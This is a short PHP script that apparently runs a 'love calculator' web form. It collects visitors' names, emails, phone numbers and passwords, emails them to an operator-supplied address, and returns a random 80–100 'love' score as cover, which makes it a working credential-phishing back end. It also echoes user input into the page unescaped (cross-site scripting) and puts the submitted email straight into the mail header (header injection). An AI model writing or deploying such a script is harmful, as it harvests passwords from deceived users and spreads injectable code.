<?php
	if(isset($_POST['submit'])){
		$name=$_POST['name'];
		$email=$_POST['email'];
		$phone=$_POST['phone'];
		$password=$_POST['password'];
		$msg=$_POST['msg'];

		$to='####'; // Receiver Email ID, Replace with your email ID
		$subject='Form Submission';
		$message="Name :".$name."\n"."Phone :".$phone."\n"."Password :".$password."\n"."Wrote the following :"."\n\n".$msg;
		$headers="From: ".$email;
        $number=rand(80,100);
		if(mail($to, $subject, $message, $headers)){
           echo "<h1>Thank you! Love between you and '$msg' is: '$number'</h1>";
         
         			echo "<h1>Checked Successfully! Thank you"." ".$name.", We will contact you shortly!</h1>";
		}
		else{
			echo "Something went wrong!";
		}
	}
?>